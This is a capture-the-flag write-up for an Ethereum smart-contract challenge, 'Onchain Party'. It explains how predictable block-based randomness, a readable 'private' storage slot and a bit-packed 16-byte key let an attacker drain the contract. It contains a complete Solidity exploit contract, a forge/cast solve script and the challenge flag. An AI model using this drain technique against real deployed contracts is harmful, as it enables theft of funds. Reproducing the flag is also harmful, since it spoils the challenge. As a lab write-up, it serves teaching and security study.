# Onchain Party

## Write-up

To solve the challenge, we need to drain the target's balance:
```solidity
function isSolved() public view returns (bool) {
    return  address(TARGET).balance == 0;
}
```
We can start by looking for any external ether transfer. After giving a quick inspection of the target contract, we may think of doing Reentrancy attack with `leaveParty` function. However, the function is protected from reentrancy by `nonReentrant` modifier.<br>

Another function is transferring ether externally:
```solidity
// is it your lucky day?
    function unlockVault(bytes16 _key) external onlyMember {
        require(uint32(bytes4(_key)) == uint32(randomize(secret)), "Hold on!");
        require(bytes8(uint64(uint128((_key << 32) >> 64))) == bytes8(uint64(uint160(msg.sender))), "Wait a minute!!");
        require(bytes4(uint32(uint128(_key))) == bytes4(abi.encodeWithSignature("unlockVault(bytes16)", bytes16("LET ME IIIIIIN"))), "Too close");

        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Something wrong happened");
}
```
We need to go over 3 obstacles:
- We need to predict the output of `randomize(secret)`: the function is using unsafe randomness. We can just call the same function on our Hack contract before making the call, the output will be the same as the calculation of the random number depends on block parameters in which both calls will be mined on the same transaction.
- We need to get the `secret` value: the state's visibility is `private`. However, we can still read the storage contains the value (it is located at storage 5).
- We need to construct 16bytes that satisfy the requirements. After analysing the bitwising happening, we conclude the following constraints on the 16-bytes key that must be sent:
    - The first 4 bytes are the return of `randomize(secret)`
    - The next 8 bytes are the last 8 bytes of the caller's address
    - The last 4 bytes are the function selector of `unlockVault(bytes16)`

#### Hack Contract
```solidity
// SPDX-License-Identifier: No-License
pragma solidity ^0.8.22;
import {OnChainParty} from "./OnChainParty.sol";
contract Hack {
    OnChainParty target;
    
    constructor(address payable _target) payable {
        require(msg.value >= 0.5 ether, "We need 0.5 ether to hack");
        target = OnChainParty(_target);
        (bool success, ) = payable(target).call{value: msg.value}("");
        require(success);
    }

    function randomize(bytes8 _secret) private view returns(bytes4) {
        return bytes4(keccak256(abi.encode(_secret, block.prevrandao, keccak256(abi.encode(block.timestamp)))));
    }

    function hack(bytes32 _secret) external {
        bytes8 secret = bytes8(uint64(uint256(_secret)));
        bytes4 part1 = randomize(secret);
        bytes8 part2 = bytes8(uint64(uint160(address(this))));
        bytes4 part3 = bytes4(abi.encodeWithSignature("unlockVault(bytes16)", bytes16("LET ME IIIIIIN")));

        bytes16 key = bytes16(bytes.concat(part1, part2, part3));

        target.unlockVault(key);
    }

    receive() external payable {}
}
```
#### Solve script
```bash
TARGET=$(cast call "$SETUP" "TARGET()(address)" --rpc-url "$RPC") 
output=$(forge create src/OnChainParty/Hack.sol:Hack --value 1ether --constructor-args "$TARGET" --rpc-url "$RPC" --private-key "$PK")

deployed_to=$(echo "$output" | grep "Deployed to" | awk '{print $3}')

secret=$(cast storage "$TARGET" 5 --rpc-url "$RPC")
cast send "$deployed_to" "hack(bytes32)" "$secret" --rpc-url "$RPC" --private-key "$PK" 

isSolved=$(cast call "$SETUP" "isSolved()(bool)" --rpc-url "$RPC")
echo "$isSolved"
// true
```
## Flag

`shellmates{$H1Ft_l3fT_$hIft_R1GHT_AND_bitw1sE_fL4g_RIS3}`
